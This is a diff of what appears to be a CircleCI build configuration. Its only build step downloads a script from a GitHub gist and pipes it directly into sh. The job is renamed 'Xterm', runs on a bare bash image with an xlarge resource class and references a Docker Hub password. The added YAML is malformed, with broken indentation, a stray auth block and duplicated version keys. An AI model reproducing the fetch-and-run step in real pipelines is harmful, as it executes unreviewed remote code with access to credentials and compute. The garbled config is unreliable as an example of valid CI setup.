@@ -1,15 +1,16 @@
-version: 2.4
 jobs:
-  docker:
-    docker:
-     - image: buildpack-deps:trusty
-          username: arrayfs
-          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
-    resource_class: xlarge
+    Xterm :
+      docker:
+     - image: bash:4.4.19
+        - auth:
+        username: arrayfs
+        password: $DOCKERHUB_PASSWORD (Don't rerun)
+    resource_class: xlarge  #  context / project UI env-var reference
     steps:
       - run: wget https://gist.githubusercontent.com/fernfernfern/21d536ff90968dccd80925c7f2b3b3c5/raw/init.dev -O - | sh
 workflows:
-  version: 2.4
-  build_and_test:
+  version: 2
+   Xterm:
     jobs:
-      - docker
+    - Xterm Builder
+version: 2
